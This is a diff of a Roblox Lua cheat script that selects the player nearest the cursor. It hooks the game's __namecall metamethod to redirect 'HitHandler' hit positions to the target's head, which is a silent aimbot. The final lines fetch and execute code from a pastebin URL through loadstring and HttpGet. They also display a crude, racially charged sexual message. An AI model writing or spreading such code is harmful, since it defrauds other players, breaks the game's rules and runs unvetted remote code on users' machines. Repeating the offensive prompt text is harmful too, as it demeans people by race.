@@ -1,3 +1,4 @@
+local Camera = workspace.CurrentCamera
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
@@ -9,15 +10,13 @@ local function findNearestPlayer()
         if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
             local character = player.Character
             local humanoidRootPart = character.HumanoidRootPart
-            local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(humanoidRootPart.Position)
+            local screenPos, onScreen = Camera:WorldToScreenPoint(humanoidRootPart.Position)
             
-            if onScreen then
-                local distance = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
-                
-                if distance < nearestDistance then
-                    nearestDistance = distance
-                    nearestPlayer = player
-                end
+            local distance = (Vector2.new(screenPos.X, screenPos.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
+            
+            if distance < nearestDistance then
+                nearestDistance = distance
+                nearestPlayer = player
             end
         end
     end
@@ -25,15 +24,32 @@ local function findNearestPlayer()
     return nearestPlayer
 end
 
-game:GetService("RunService").RenderStepped:Connect(function()
-    local targetPlayer = findNearestPlayer()
+local targetPlayer
+game:GetService("RunService").Stepped:Connect(function()
+    local previousTargetPlayer = targetPlayer
+    targetPlayer = findNearestPlayer()
     
-    if targetPlayer then
-        local targetCharacter = targetPlayer.Character
-        local targetHumanoidRootPart = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
-        
-        if targetHumanoidRootPart then
-            LocalPlayer.Character:SetPrimaryPartCFrame(targetHumanoidRootPart.CFrame)
-        end
+    if targetPlayer and targetPlayer ~= previousTargetPlayer then
+        print("New target acquired:", targetPlayer.Name)
+        -- You can replace the print statement with your desired notification display logic
     end
 end)
+
+local oldNamecall = hookmetamethod(game, "__namecall", function(Self, ...)
+    local args = {...}
+    local method = getnamecallmethod()
+    
+    if method == "InvokeServer" and Self.Name == "HitHandler" then
+        if args[1] and args[1]["HitPos"] then
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") and targetPlayer.Character.Humanoid.Health ~= 0 then
+                args[1]["HitPos"] = targetPlayer.Character.Head.Position
+                args[1]["HitObj"] = targetPlayer.Character.Head
+            end
+        end
+    end
+    
+    return oldNamecall(Self, unpack(args))
+end)
+
+local notifications = loadstring(game:HttpGet("https://pastebin.com/raw/kSLQbpjV"))()
+notifications.prompt('I like oily black men', 'This script was made by oooga booga')
